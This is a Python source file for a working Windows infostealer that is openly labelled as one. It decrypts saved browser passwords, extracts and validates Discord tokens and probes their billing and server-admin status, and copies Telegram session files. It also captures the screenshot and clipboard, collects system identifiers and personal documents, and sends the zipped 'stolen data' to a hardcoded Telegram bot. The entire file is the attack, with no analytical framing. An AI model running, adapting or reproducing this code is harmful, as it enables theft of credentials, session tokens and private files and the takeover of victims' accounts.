import os
import json
import ctypes
import base64
import getpass
import requests
import zipfile
import tempfile
import asyncio
import re
import wmi
import pyperclip
import platform
import uuid
from aiogram import Bot
from aiogram.types import FSInputFile
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime
from typing import List, Dict, Optional, Any
from PIL import Image
import pyautogui

# Telegram configuration
BOT_TOKEN = "8086375913:AAFWg29EzjRZFpnzq81INB_QG7tjvcGk4e4"  # Replace with your token
USER_ID = 7963879790  # Replace with your Telegram ID
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 MB maximum for Telegram (API hard limit)
LOG_FILE = os.path.join(tempfile.gettempdir(), "stealer_log.txt")

username = getpass.getuser()

def log_error(message):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{datetime.now()}: {message}\n")
    print(f"ERROR: {message}")

def log_info(message):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{datetime.now()}: {message}\n")
    print(f"[INFO]: {message}")

# Browser login decryption
def find_profiles(browser_paths):
    profiles = []
    try:
        for browser, path in browser_paths.items():
            if os.path.exists(path):
                for name in os.listdir(path):
                    p = os.path.join(path, name)
                    if os.path.isdir(p):
                        if all(os.path.exists(os.path.join(p, f)) for f in ['logins.json', 'key4.db', 'cert9.db']):
                            profiles.append((browser, p))
        log_info(f"Found browser profiles: {len(profiles)}")
    except Exception as e:
        log_error(f"Error finding profiles: {str(e)}")
    return profiles

def setup_nss(profile_path):
    try:
        nss_path = r'C:\Program Files\Zen Browser'
        os.environ['PATH'] += f';{nss_path}'
        nss = ctypes.CDLL(os.path.join(nss_path, 'nss3.dll'))
        if nss.NSS_Init(profile_path.encode()) != 0:
            raise RuntimeError('NSS_Init failed')
        log_info(f"NSS successfully initialized for profile: {profile_path}")
        return nss
    except Exception as e:
        log_error(f"Error setting up NSS: {str(e)}")
        return None

def decrypt_logins(profile_path, nss):
    results = []
    try:
        with open(os.path.join(profile_path, 'logins.json'), 'r', encoding='utf-8') as f:
            data = json.load(f)

        class SECItem(ctypes.Structure):
            _fields_ = [('type', ctypes.c_uint), ('data', ctypes.c_char_p), ('len', ctypes.c_uint)]

        def decrypt_string(enc_b64):
            try:
                enc = base64.b64decode(enc_b64)
                item = SECItem()
                item.type = 0
                item.len = len(enc)
                item.data = ctypes.cast(ctypes.create_string_buffer(enc), ctypes.c_char_p)
                out = SECItem()
                if nss.PK11SDR_Decrypt(ctypes.byref(item), ctypes.byref(out), None) == 0:
                    return ctypes.string_at(out.data, out.len).decode()
                return ''
            except Exception as e:
                log_error(f"Error decrypting string: {str(e)}")
                return ''

        for login in data['logins']:
            user = decrypt_string(login['encryptedUsername'])
            pw = decrypt_string(login['encryptedPassword'])
            host = login['hostname']
            if user and pw:
                results.append(f'{host} | {user} | {pw}')
        log_info(f"Extracted logins from profile {profile_path}: {len(results)}")
    except Exception as e:
        log_error(f"Error decrypting logins: {str(e)}")
    return results

# Discord token grabber
class TokenExtractor:
    def __init__(self):
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens: List[str] = []

    def get_browser_paths(self):
        return {
            'Discord': f'{self.roaming}\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': f'{self.roaming}\\discordcanary\\Local Storage\\leveldb\\',
            'Discord PTB': f'{self.roaming}\\discordptb\\Local Storage\\leveldb\\',
            'Chrome': f'{self.appdata}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Opera': f'{self.roaming}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': f'{self.roaming}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Microsoft Edge': f'{self.appdata}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': f'{self.appdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': f'{self.appdata}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\'
        }

    def decrypt_token(self, buff: bytes, master_key: bytes) -> Optional[str]:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception as e:
            log_error(f"Error decrypting token: {str(e)}")
            return None

    def get_master_key(self, path: str) -> Optional[bytes]:
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = CryptUnprotectData(master_key[5:], None, None, None, 0)[1]
            return master_key
        except Exception as e:
            log_error(f"Error getting master key: {str(e)}")
            return None

    def validate_token(self, token: str) -> bool:
        try:
            response = requests.get(self.base_url, headers={'Authorization': token}, timeout=5)
            return response.status_code == 200
        except Exception as e:
            log_error(f"Error validating token: {str(e)}")
            return False

    def extract(self) -> List[Dict[str, Any]]:
        token_info_list = []
        sources = {}
        for name, path in self.get_browser_paths().items():
            if not os.path.exists(path):
                log_info(f"Path {path} does not exist")
                continue
            discord_process = "cord" in path.lower()
            if discord_process:
                local_state_path = os.path.join(self.roaming, name.replace(" ", "").lower(), 'Local State')
                if not os.path.exists(local_state_path):
                    log_info(f"Local State not found: {local_state_path}")
                    continue
                master_key = self.get_master_key(local_state_path)
                if not master_key:
                    continue
            for file_name in os.listdir(path):
                if not file_name.endswith(('.log', '.ldb')):
                    continue
                try:
                    with open(os.path.join(path, file_name), errors='ignore') as file:
                        for line in file.readlines():
                            line = line.strip()
                            if discord_process:
                                for match in re.findall(self.regexp_enc, line):
                                    token_enc = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
                                    token = self.decrypt_token(token_enc, master_key)
                                    if token and self.validate_token(token) and token not in self.tokens:
                                        self.tokens.append(token)
                                        sources[token] = name
                            else:
                                for token in re.findall(self.regexp, line):
                                    if self.validate_token(token) and token not in self.tokens:
                                        self.tokens.append(token)
                                        sources[token] = name
                except Exception as e:
                    log_error(f"Error reading Discord file {file_name}: {str(e)}")
        for token in self.tokens:
            token_info = self.get_account_info(token)
            token_info["source"] = sources.get(token, "Unknown")
            token_info_list.append(token_info)
        log_info(f"Extracted Discord tokens: {len(token_info_list)}")
        return token_info_list

    def get_account_info(self, token: str) -> Dict[str, Any]:
        base_info = {
            "token": token,
            "valid": True,
            "username": "Unknown",
            "id": "Unknown",
            "email": "Unknown",
            "phone": "Unknown",
            "avatar": None,
            "nitro": False,
            "billing": False,
            "mfa": False
        }
        try:
            user_response = requests.get(self.base_url, headers={"Authorization": token}, timeout=5)
            if user_response.status_code == 200:
                user_data = user_response.json()
                base_info["username"] = f"{user_data.get('username', 'Unknown')}#{user_data.get('discriminator', '0000')}"
                base_info["id"] = user_data.get("id", "Unknown")
                base_info["email"] = user_data.get("email", "None")
                base_info["phone"] = user_data.get("phone", "None")
                base_info["avatar"] = f"https://cdn.discordapp.com/avatars/{user_data.get('id')}/{user_data.get('avatar')}.png" if user_data.get('avatar') else None
                base_info["mfa"] = user_data.get("mfa_enabled", False)
                nitro_resp = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers={"Authorization": token}, timeout=5)
                base_info["nitro"] = len(nitro_resp.json()) > 0 if nitro_resp.status_code == 200 else False
                billing_resp = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers={"Authorization": token}, timeout=5)
                base_info["billing"] = len(billing_resp.json()) > 0 if billing_resp.status_code == 200 else False
                guilds_resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": token}, timeout=5)
                if guilds_resp.status_code == 200:
                    guilds = guilds_resp.json()
                    base_info["guilds_count"] = len(guilds)
                    admin_guilds = [guild for guild in guilds if (int(guild.get("permissions", "0")) & 0x8) == 0x8]
                    base_info["admin_guilds_count"] = len(admin_guilds)
                    owned_guilds = [guild for guild in guilds if guild.get("owner", False)]
                    base_info["owned_guilds_count"] = len(owned_guilds)
                    important_guilds = []
                    for guild in (owned_guilds + admin_guilds)[:5]:
                        important_guilds.append({
                            "name": guild.get("name", "Unknown"),
                            "id": guild.get("id", "Unknown"),
                            "owner": guild.get("owner", False),
                            "admin": (int(guild.get("permissions", "0")) & 0x8) == 0x8
                        })
                    base_info["important_guilds"] = important_guilds
                friends_resp = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={"Authorization": token}, timeout=5)
                if friends_resp.status_code == 200:
                    friends = friends_resp.json()
                    base_info["friends_count"] = len(friends)
        except Exception as e:
            log_error(f"Error getting account info: {str(e)}")
            base_info["valid"] = False
        return base_info

# Telegram tdata grabber
def find_tdata_folder():
    path = os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata")
    if os.path.isdir(path):
        log_info(f"tdata folder found: {path}")
        return path
    log_error("Telegram tdata folder not found")
    return None

def get_file_size(file_path):
    try:
        size = os.path.getsize(file_path)
        return size
    except OSError as e:
        log_error(f"Error getting file size {file_path}: {str(e)}")
        return 0

def is_essential_file(filename, filepath):
    essential_patterns = ['key_datas', 'key_data', 'settings', 'maps', 'usertag']
    exclude_patterns = ['cache', 'temp', 'media_cache', 'stickers', 'thumbnails', 'downloads', 'user_photos', 'saved', 'emoji', 'export', '.lock', '.binlog', '.journal', '.temp', '.tmp']
    filename_lower = filename.lower()
    for pattern in exclude_patterns:
        if pattern in filename_lower:
            return False
    if get_file_size(filepath) > 5 * 1024 * 1024:
        return False
    for pattern in essential_patterns:
        if pattern in filename_lower:
            return True
    if filename.isdigit() and len(filename) <= 16:
        return True
    if filename_lower.endswith(('s', 'map', 'data')) and get_file_size(filepath) < 1024 * 1024:
        return True
    return False

# System info and other data
def get_system_info():
    info = []
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
        info.append(f"IP Address: {ip}")
    except Exception as e:
        log_error(f"Error getting IP: {str(e)}")
        info.append("IP Address: Unknown")
    try:
        hwid = str(uuid.getnode())
        info.append(f"HWID: {hwid}")
    except:
        info.append("HWID: Unknown")
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
        info.append(f"MAC Address: {mac}")
    except:
        info.append("MAC Address: Unknown")
    try:
        c = wmi.WMI()
        system = c.Win32_ComputerSystem()[0]
        cpu = c.Win32_Processor()[0]
        os_info = c.Win32_OperatingSystem()[0]
        info.append(f"Computer Name: {platform.node()}")
        info.append(f"OS: {os_info.Caption} {os_info.BuildNumber}")
        info.append(f"CPU: {cpu.Name}")
        info.append(f"RAM: {round(int(os_info.TotalVisibleMemorySize) / 1024 / 1024, 2)} GB")
        info.append(f"Manufacturer: {system.Manufacturer}")
        info.append(f"Model: {system.Model}")
    except Exception as e:
        log_error(f"Error getting system info: {str(e)}")
        info.append("System Info: Unknown")
    return info

def get_clipboard():
    try:
        clipboard = pyperclip.paste()
        log_info("Clipboard successfully captured")
        return clipboard
    except Exception as e:
        log_error(f"Error getting clipboard: {str(e)}")
        return "Clipboard: Unknown"

def take_screenshot(temp_dir):
    try:
        screenshot = pyautogui.screenshot()
        screenshot_path = os.path.join(temp_dir, "screenshot.png")
        screenshot.save(screenshot_path)
        log_info(f"Screenshot saved: {screenshot_path}")
        return screenshot_path
    except Exception as e:
        log_error(f"Error taking screenshot: {str(e)}")
        return None

def collect_user_files():
    paths = [
        os.path.join(os.getenv("USERPROFILE"), "Desktop"),
        os.path.join(os.getenv("USERPROFILE"), "Documents"),
        os.path.join(os.getenv("USERPROFILE"), "Pictures")
    ]
    files = []
    for path in paths:
        if os.path.exists(path):
            for root, _, filenames in os.walk(path):
                for filename in filenames:
                    filepath = os.path.join(root, filename)
                    if get_file_size(filepath) < 2 * 1024 * 1024:  # 2 MB limit per file
                        files.append((filepath, os.path.relpath(filepath, os.getenv("USERPROFILE"))))
    log_info(f"Collected user files: {len(files)}")
    return files[:1000]  # Limit to reduce archive size

def create_zip_archive(temp_dir, browser_data, discord_data, tdata_path, user_files, screenshot_path):
    zip_paths = []
    current_zip_path = os.path.join(temp_dir, "stolen_data_part1.zip")
    current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9)
    current_size = 0
    part_number = 1

    try:
        # User files
        for filepath, rel_path in user_files:
            try:
                file_size = get_file_size(filepath)
                if current_size + file_size > MAX_FILE_SIZE:
                    current_zip.close()
                    zip_paths.append(current_zip_path)
                    part_number += 1
                    current_zip_path = os.path.join(temp_dir, f"stolen_data_part{part_number}.zip")
                    current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9)
                    current_size = 0
                current_zip.write(filepath, os.path.join(username, rel_path))
                current_size += file_size
            except Exception as e:
                log_error(f"Error adding file {filepath} to ZIP: {str(e)}")
        
        # Discord data
        if discord_data:
            discord_file = os.path.join(temp_dir, "discord_tokens.json")
            with open(discord_file, 'w', encoding='utf-8') as f:
                json.dump(discord_data, f, indent=2)
            file_size = get_file_size(discord_file)
            if current_size + file_size > MAX_FILE_SIZE:
                current_zip.close()
                zip_paths.append(current_zip_path)
                part_number += 1
                current_zip_path = os.path.join(temp_dir, f"stolen_data_part{part_number}.zip")
                current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9)
                current_size = 0
            current_zip.write(discord_file, os.path.join("Discord", "discord_tokens.json"))
            current_size += file_size
            os.remove(discord_file)
            log_info("Discord data added to ZIP")
        
        # Telegram data
        if tdata_path:
            for root, _, files in os.walk(tdata_path):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    if is_essential_file(filename, filepath):
                        rel_path = os.path.relpath(filepath, tdata_path)
                        file_size = get_file_size(filepath)
                        if current_size + file_size > MAX_FILE_SIZE:
                            current_zip.close()
                            zip_paths.append(current_zip_path)
                            part_number += 1
                            current_zip_path = os.path.join(temp_dir, f"stolen_data_part{part_number}.zip")
                            current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9)
                            current_size = 0
                        current_zip.write(filepath, os.path.join("Telegram", "Tdata", rel_path))
                        current_size += file_size
            log_info("Telegram data added to ZIP in Tdata subfolder")
        
        # Browser data
        for browser, data in browser_data.items():
            if data:
                browser_file = os.path.join(temp_dir, f"{browser}_logins.txt")
                with open(browser_file, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(data))
                file_size = get_file_size(browser_file)
                if current_size + file_size > MAX_FILE_SIZE:
                    current_zip.close()
                    zip_paths.append(current_zip_path)
                    part_number += 1
                    current_zip_path = os.path.join(temp_dir, f"stolen_data_part{part_number}.zip")
                    current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9)
                    current_size = 0
                current_zip.write(browser_file, os.path.join(browser, f"{browser}_logins.txt"))
                current_size += file_size
                os.remove(browser_file)
                log_info(f"{browser} logins added to ZIP")
        
        # System info
        system_info = get_system_info()
        system_file = os.path.join(temp_dir, "system_info.txt")
        with open(system_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(system_info))
        file_size = get_file_size(system_file)
        if current_size + file_size > MAX_FILE_SIZE:
            current_zip.close()
            zip_paths.append(current_zip_path)
            part_number += 1
            current_zip_path = os.path.join(temp_dir, f"stolen_data_part{part_number}.zip")
            current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9)
            current_size = 0
        current_zip.write(system_file, os.path.join("System", "system_info.txt"))
        current_size += file_size
        os.remove(system_file)
        log_info("System info added to ZIP")
        
        # Clipboard
        clipboard_data = get_clipboard()
        clipboard_file = os.path.join(temp_dir, "clipboard.txt")
        with open(clipboard_file, 'w', encoding='utf-8') as f:
            f.write(clipboard_data)
        file_size = get_file_size(clipboard_file)
        if current_size + file_size > MAX_FILE_SIZE:
            current_zip.close()
            zip_paths.append(current_zip_path)
            part_number += 1
            current_zip_path = os.path.join(temp_dir, f"stolen_data_part{part_number}.zip")
            current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9)
            current_size = 0
        current_zip.write(clipboard_file, os.path.join("System", "clipboard.txt"))
        current_size += file_size
        os.remove(clipboard_file)
        log_info("Clipboard added to ZIP")
        
        # Screenshot
        if screenshot_path:
            file_size = get_file_size(screenshot_path)
            if current_size + file_size > MAX_FILE_SIZE:
                current_zip.close()
                zip_paths.append(current_zip_path)
                part_number += 1
                current_zip_path = os.path.join(temp_dir, f"stolen_data_part{part_number}.zip")
                current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9)
                current_size = 0
            current_zip.write(screenshot_path, "screenshot.png")
            current_size += file_size
            os.remove(screenshot_path)
            log_info("Screenshot added to ZIP")
        
        current_zip.close()
        zip_paths.append(current_zip_path)
        for zip_path in zip_paths:
            log_info(f"ZIP archive created: {zip_path}, size: {get_file_size(zip_path) / 1024 / 1024:.1f} MB")
        return zip_paths
    except Exception as e:
        log_error(f"Error creating ZIP: {str(e)}")
        if current_zip:
            current_zip.close()
        return []

async def send_to_telegram(zip_path):
    bot = Bot(token=BOT_TOKEN)
    try:
        file_size_mb = get_file_size(zip_path) / 1024 / 1024
        log_info(f"Attempting to send ZIP to Telegram, size: {file_size_mb:.1f} MB")
        document = FSInputFile(zip_path)
        await bot.send_document(USER_ID, document, caption=f"Stolen Data Archive ({file_size_mb:.1f}MB)")
        log_info(f"ZIP successfully sent to Telegram: {zip_path}")
        return True
    except Exception as e:
        log_error(f"Error sending to Telegram: {str(e)}")
        return False
    finally:
        await bot.session.close()

async def main():
    log_info("Starting main...")
    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            log_info(f"Temporary directory created: {temp_dir}")
            # Browser logins
            browser_data = {}
            browser_paths = {
                'Zen': rf'C:\Users\{username}\AppData\Roaming\zen\Profiles',
                'Chrome': rf'C:\Users\{username}\AppData\Local\Google\Chrome\User Data'
            }
            profiles = find_profiles(browser_paths)
            for browser, profile in profiles:
                try:
                    nss = setup_nss(profile)
                    if nss:
                        res = decrypt_logins(profile, nss)
                        browser_data[browser] = browser_data.get(browser, []) + res
                except Exception as e:
                    log_error(f"Error processing profile {profile}: {str(e)}")
            # Discord tokens
            discord_data = []
            try:
                extractor = TokenExtractor()
                discord_data = extractor.extract()
            except Exception as e:
                log_error(f"Error extracting Discord tokens: {str(e)}")
            # Telegram data
            tdata_path = find_tdata_folder()
            # User files
            user_files = collect_user_files()
            # Screenshot
            screenshot_path = take_screenshot(temp_dir)
            # Create ZIP archives
            zip_paths = create_zip_archive(temp_dir, browser_data, discord_data, tdata_path, user_files, screenshot_path)
            if zip_paths:
                log_info(f"Created ZIP archives: {len(zip_paths)}")
                for zip_path in zip_paths:
                    await send_to_telegram(zip_path)
            else:
                log_error("Failed to create ZIP archives")
    except Exception as e:
        log_error(f"Critical error in main: {str(e)}")

if __name__ == "__main__":
    asyncio.run(main())
